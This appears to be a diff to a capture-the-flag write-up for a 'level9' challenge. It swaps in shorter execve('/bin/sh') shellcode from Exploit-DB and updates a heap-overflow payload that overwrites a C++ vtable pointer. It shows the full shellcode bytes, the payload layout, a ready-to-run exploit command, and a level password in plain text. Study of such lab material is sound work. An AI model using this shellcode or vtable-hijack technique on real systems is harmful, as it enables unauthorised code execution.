@@ -33,21 +33,23 @@
    - Addresses without null bytes
    
    Solution:
-   - Use null-free shellcode (40 bytes):
-     \xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c
-     \x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe1\xff\xff
-     \xff\x2f\x62\x69\x6e\x2f\x73\x68
+   - Use null-free shellcode from Exploit-DB 42428 (24 bytes):
+     Author: Touhid M.Shaikh
+     Source: https://www.exploit-db.com/shellcodes/42428
+     
+     \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
+     \x50\x53\x89\xe1\xb0\x0b\xcd\x80
    
    - Place NOP sled + shellcode at start of annotation buffer
    - Overflow to overwrite obj2's vtable with fake vtable address
    - Fake vtable points back to our shellcode location
    
    Payload structure:
-   [20 NOPs] + [40-byte shellcode] + [48 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
+   [44 NOPs] + [24-byte shellcode] + [40 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
    
-   - Bytes 0-19: NOP sled (\x90 * 20)
-   - Bytes 20-59: Shellcode (40 bytes)
-   - Bytes 60-107: NOP padding (\x90 * 48)
+   - Bytes 0-43: NOP sled (\x90 * 44)
+   - Bytes 44-67: Shellcode (24 bytes)
+   - Bytes 68-107: NOP padding (\x90 * 40)
    - Bytes 108-111: Fake vtable pointer = 0x0804a07c (\x7c\xa0\x04\x08)
    - Bytes 112-115: Shellcode address = 0x0804a01c (\x1c\xa0\x04\x08)
    
@@ -59,7 +61,7 @@
    Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 
 6. Execute the exploit:
-   ./level9 $(python -c 'print "\x90"*20 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*48 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
+   ./level9 $(python -c 'print "\x90"*44 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*40 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
    
    Shell spawned!
 
